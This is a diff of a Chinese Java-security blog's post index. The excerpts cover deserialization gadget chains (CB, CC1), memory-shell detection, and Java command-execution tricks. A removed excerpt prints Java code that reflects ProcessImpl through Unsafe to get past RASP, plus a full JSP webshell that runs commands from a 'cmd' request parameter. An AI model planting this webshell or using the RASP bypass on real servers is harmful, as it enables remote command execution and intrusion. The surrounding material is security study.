@@ -172,6 +172,107 @@
         
 
 <div class="post">
+    <a href="/2024/04/22/CB%E9%93%BE/">
+        <h2 class="post-title">CB链 分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h1><p>PropertyUtils.getProperty 可以进行一个对属性的get</p>
+<p>其中这个属性是可控的</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300912126.png" alt="image-20240430091219035"></p>
+<p>当复合规范的javaBean (实现了getName方法) 存在的时候 就可以正常调用</p>
+<p>不存在时报错</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300913040.png" alt="image-20240430091341958"></p>
+<p>那么针对这个传入的beans 如果是某个精心构造对象 其存在getXxxxx这样的方法 我们就可以</p>
+<p>考虑TemplatesImpl#getOutputProperties</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300923905.png" alt="image-20240430092310829"></p>
+<p>其内调用了newTransformer</p>
+<p>而我们在cc的学习中知道newTransformer是可以动态加载类的</p>
+<p>也就是可以代码执行</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ffa2c4">java</a>
+        </span>
+        
+    </div>
+    <a href="/2024/04/22/CB%E9%93%BE/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/">
+        <h2 class="post-title">内存马查杀</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/11
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>arthas下载</p>
+<pre><code>curl -O https://arthas.aliyun.com/arthas-boot.jar
+</code></pre>
+<p>启动一个tomcat的项目</p>
+<p>哥斯拉生成内存马</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404121157369.png" alt="image-20240412115718218"></p>
+<p>初始化失败 但是能弹计算器</p>
+<p>将session换为application 连接成功</p>
+<h2 id="哥斯拉filter型内存马"><a href="#哥斯拉filter型内存马" class="headerlink" title="哥斯拉filter型内存马"></a>哥斯拉filter型内存马</h2><p><code> mbean | grep &quot;name=/&quot;</code></p>
+<p>植入内存马前</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404121158341.png" alt="image-20240412115845309"></p>
+<p>植入filter类型的内存马</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404121242650.png" alt="image-20240412124259580"></p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
+        </span>
+        
+    </div>
+    <a href="/2024/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/04/08/2023-04-Unit42-Wireshark-quiz/">
         <h2 class="post-title">2023-04-Unit42-Wireshark-quiz</h2>
     </a>
@@ -217,7 +318,7 @@
         
         <span class="tag">
             
-            <a href="/tags/flowanalysis/" style="color: #00a596">flowanalysis</a>
+            <a href="/tags/flowanalysis/" style="color: #03a9f4">flowanalysis</a>
         </span>
         
     </div>
@@ -261,7 +362,7 @@
         
         <span class="tag">
             
-            <a href="/tags/evasion/" style="color: #ff7d73">evasion</a>
+            <a href="/tags/evasion/" style="color: #00bcd4">evasion</a>
         </span>
         
     </div>
@@ -303,7 +404,7 @@
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/java/" style="color: #00a596">java</a>
         </span>
         
     </div>
@@ -344,7 +445,7 @@
         
         <span class="tag">
             
-            <a href="/tags/evasion/" style="color: #03a9f4">evasion</a>
+            <a href="/tags/evasion/" style="color: #00a596">evasion</a>
         </span>
         
     </div>
@@ -370,7 +471,7 @@
         <div class="content" v-pre>
             
             <h1 id="MemShell"><a href="#MemShell" class="headerlink" title="MemShell"></a>MemShell</h1><p>一句话</p>
-<p><code>利用类加载或Agent机制在JavaEE、.框架或中间件的API中动态注册一个可访问的后门</code></p>
+<p><code>利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门</code></p>
 <h2 id="基础认知"><a href="#基础认知" class="headerlink" title="基础认知"></a>基础认知</h2><p>内存马又名无文件马，见名知意，指的是无文件落地的webshell</p>
 <p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401211532045.png" alt="图片"></p>
             
@@ -386,7 +487,7 @@
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
         </span>
         
     </div>
@@ -504,7 +605,7 @@
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #00a596">java</a>
         </span>
         
     </div>
@@ -557,367 +658,11 @@
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #03a9f4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
     <a href="/2024/02/25/CommonCollections2/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/02/24/CommonCollections1/">
-        <h2 class="post-title">CommonCollections1</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/2/24
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="CommonsCollections1-TransformedMap"><a href="#CommonsCollections1-TransformedMap" class="headerlink" title="CommonsCollections1  (TransformedMap)"></a>CommonsCollections1  (TransformedMap)</h2><p>那就可以正式开始跟链子了</p>
-<p>逆着跟 首先考虑在哪里调用了transform 因为我们的命令调用的最终以transform结束</p>
-<p><code>alt+f7 find Usage</code></p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939669.png" alt="image-20240201140759741"></p>
-<p>这里代码随便写点 目的就是看谁调用了transform方法</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939478.png" alt="image-20240201140853784"></p>
-<p>这里选择跟进TransformedMap</p>
-<p>为什么? 因为这就是CC1(</p>
-<p>这里选择不同的类会影响最终是否能走到readObject 即链子就不同了 这里我们考虑的是CC1 所以这么跟进</p>
-<p>如果是自己在找链子 可以都看看 直到找到可用的中间类</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
-        </span>
-        
-    </div>
-    <a href="/2024/02/24/CommonCollections1/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-        <h2 class="post-title">JavaSec基础命令执行</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/1/27
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>记录<a target="_blank" rel="noopener" href="https://github.com/javaweb-sec/javaweb-sec%E7%9A%84%E5%AD%A6%E4%B9%A0">https://github.com/javaweb-sec/javaweb-sec的学习</a></p>
-<h1 id="CommandExecute"><a href="#CommandExecute" class="headerlink" title="CommandExecute"></a>CommandExecute</h1><p>Runtime#exec</p>
-<p>ProcessBuilder#start</p>
-<p>以上两个最终都要调到ProcessImpl</p>
-<p>而ProcessImpl会调用native的forkAndExec</p>
-<p>实际最终都是调到Java_java_lang_ProcessImpl_forkAndExec</p>
-<p>而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p>
-<p>但是我本地跟了一下 最终调的是Java_java_lang_ProcessImpl_create  并没有找到 Java_java_lang_ProcessImpl_forkAndExec</p>
-<p>在linux下有forkAndExec</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/80348e9d2a819916527fcb258707602d.png" alt="image-20240127135535440"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/595ea11cea97f3b0f654478d5b51d189.png" alt="image-20240127135551312"></p>
-<pre><code class="cpp">Java_java_lang_ProcessImpl_create(JNIEnv *env, jclass ignored,
-                                  jstring cmd,
-                                  jstring envBlock,
-                                  jstring dir,
-                                  jlongArray stdHandles,
-                                  jboolean redirectErrorStream)
-&#123;
-    jlong ret = 0;
-    if (cmd != NULL &amp;&amp; stdHandles != NULL) &#123;
-        const jchar *pcmd = (*env)-&gt;GetStringChars(env, cmd, NULL);
-        if (pcmd != NULL) &#123;
-            const jchar *penvBlock = (envBlock != NULL)
-                ? (*env)-&gt;GetStringChars(env, envBlock, NULL)
-                : NULL;
-            const jchar *pdir = (dir != NULL)
-                ? (*env)-&gt;GetStringChars(env, dir, NULL)
-                : NULL;
-            jlong *handles = (*env)-&gt;GetLongArrayElements(env, stdHandles, NULL);
-            if (handles != NULL) &#123;
-                ret = processCreate(
-                    env,
-                    pcmd,
-                    penvBlock,
-                    pdir,
-                    handles,
-                    redirectErrorStream);
-                (*env)-&gt;ReleaseLongArrayElements(env, stdHandles, handles, 0);
-            &#125;
-            if (pdir != NULL)
-                (*env)-&gt;ReleaseStringChars(env, dir, pdir);
-            if (penvBlock != NULL)
-                (*env)-&gt;ReleaseStringChars(env, envBlock, penvBlock);
-            (*env)-&gt;ReleaseStringChars(env, cmd, pcmd);
-        &#125;
-    &#125;
-    return ret;
-&#125;
-</code></pre>
-<p>这里就不写Runtime和ProcessBuilder的了</p>
-<h2 id="反射ProcessImpl命令执行"><a href="#反射ProcessImpl命令执行" class="headerlink" title="反射ProcessImpl命令执行"></a>反射ProcessImpl命令执行</h2><pre><code class="java">package tem;
-
-import java.io.IOException;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-import java.util.Map;
-
-public class Exec &#123;
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;
-        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
-        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
-        startMethod.setAccessible(true);
-        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
-    &#125;
-&#125;
-</code></pre>
-<p>高版本则需要用Unsafe绕过</p>
-<pre><code class="java">package tem;
-
-import sun.misc.Unsafe;
-
-import java.io.IOException;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-import java.util.Map;
-
-public class Exec &#123;
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123;
-        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
-        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
-
-        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
-        unsafeField.setAccessible(true);
-        Unsafe unsafe = (Unsafe) unsafeField.get(null);
-        Class cureentClass = Exec.class;
-
-        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());
-
-
-        startMethod.setAccessible(true);
-        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
-    &#125;
-&#125;
-</code></pre>
-<h2 id="反射Java-java-lang-ProcessImpl-create命令执行"><a href="#反射Java-java-lang-ProcessImpl-create命令执行" class="headerlink" title="反射Java_java_lang_ProcessImpl_create命令执行"></a>反射Java_java_lang_ProcessImpl_create命令执行</h2><p>当ProcessImpl也不能用的时候可以考虑</p>
-<p>过程如下</p>
-<ol>
-<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>ProcessImpl</code>类对象。</li>
-<li>反射<code>ProcessImpl</code>类的<code>create</code>方法。</li>
-<li>构造<code>create</code>需要的参数并调用。</li>
-</ol>
-<pre><code class="java">package tem;
-
-import sun.misc.Unsafe;
-
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-
-public class NativeExec &#123;
-    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;
-        // 获取ProcessImpl的实例
-        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
-        unsafeField.setAccessible(true);
-        Unsafe unsafe = (Unsafe) unsafeField.get(null);
-        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
-        Object o = unsafe.allocateInstance(clazz);
-
-        Method createMethod = clazz.getDeclaredMethod(&quot;create&quot;, String.class, String.class, String.class, long[].class, boolean.class);
-
-        Class cureentClass = NativeExec.class;
-        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());
-
-        createMethod.setAccessible(true);
-//        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructor(String[].class,String.class,String.class,long[].class,boolean.class,boolean.class);
-//        declaredConstructor.setAccessible(true);
-//        System.out.println(declaredConstructor);
-//        Object p = declaredConstructor.newInstance(new String[]&#123;&quot;calc&quot;&#125;, null, null, new long[]&#123;-1L,-1L,-1L&#125;, false, false);
-//        System.out.println(p);
-        createMethod.invoke(null,
-                &quot;calc&quot;,
-                null,
-                null,
-                new long[]&#123;-1L,-1L,-1L&#125;,
-                false);
-
-
-
-    &#125;
-&#125;
-</code></pre>
-<p>在linux下则是<code>forkAndExec</code> 这个直接抄了</p>
-<p>过程如下</p>
-<ol>
-<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li>
-<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li>
-<li>构造<code>forkAndExec</code>需要的参数并调用。</li>
-<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li>
-<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
-</ol>
-<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
-&lt;%@ page import=&quot;sun.misc.Unsafe&quot; %&gt;
-&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
-&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
-&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
-&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
-&lt;%!
-    byte[] toCString(String s) &#123;
-        if (s == null)
-            return null;
-        byte[] bytes  = s.getBytes();
-        byte[] result = new byte[bytes.length + 1];
-        System.arraycopy(bytes, 0,
-                result, 0,
-                bytes.length);
-        result[result.length - 1] = (byte) 0;
-        return result;
-    &#125;
-
-
-%&gt;
-&lt;%
-    String[] strs = request.getParameterValues(&quot;cmd&quot;);
-
-    if (strs != null) &#123;
-        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
-        theUnsafeField.setAccessible(true);
-        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
-
-        Class processClass = null;
-
-        try &#123;
-            processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);
-        &#125; catch (ClassNotFoundException e) &#123;
-            processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);
-        &#125;
-
-        Object processObject = unsafe.allocateInstance(processClass);
-
-        // Convert arguments to a contiguous block; it&#39;s easier to do
-        // memory management in Java than in C.
-        byte[][] args = new byte[strs.length - 1][];
-        int      size = args.length; // For added NUL bytes
-
-        for (int i = 0; i &lt; args.length; i++) &#123;
-            args[i] = strs[i + 1].getBytes();
-            size += args[i].length;
-        &#125;
-
-        byte[] argBlock = new byte[size];
-        int    i        = 0;
-
-        for (byte[] arg : args) &#123;
-            System.arraycopy(arg, 0, argBlock, i, arg.length);
-            i += arg.length + 1;
-            // No need to write NUL bytes explicitly
-        &#125;
-
-        int[] envc                 = new int[1];
-        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;
-        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);
-        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);
-        launchMechanismField.setAccessible(true);
-        helperpathField.setAccessible(true);
-        Object launchMechanismObject = launchMechanismField.get(processObject);
-        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
-
-        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);
-
-        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;
-                int.class, byte[].class, byte[].class, byte[].class, int.class,
-                byte[].class, int.class, byte[].class, int[].class, boolean.class
-        &#125;);
-
-        forkMethod.setAccessible(true);// 设置访问权限
-
-        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;
-                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
-                null, envc[0], null, std_fds, false
-        &#125;);
-
-        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
-        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);
-        initStreamsMethod.setAccessible(true);
-        initStreamsMethod.invoke(processObject, std_fds);
-
-        // 获取本地执行结果的输入流
-        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);
-        getInputStreamMethod.setAccessible(true);
-        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
-
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        int                   a    = 0;
-        byte[]                b    = new byte[1024];
-
-        while ((a = in.read(b)) != -1) &#123;
-            baos.write(b, 0, a);
-        &#125;
-
-        out.println(&quot;&lt;pre&gt;&quot;);
-        out.println(baos.toString());
-        out.println(&quot;&lt;/pre&gt;&quot;);
-        out.flush();
-        out.close();
-    &#125;
-%&gt;
-</code></pre>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/java/" style="color: #03a9f4">java</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%AE%A1/" style="color: #00bcd4">代码复审</a>
-        </span>
-        
-    </div>
-    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
 </div>
 
 
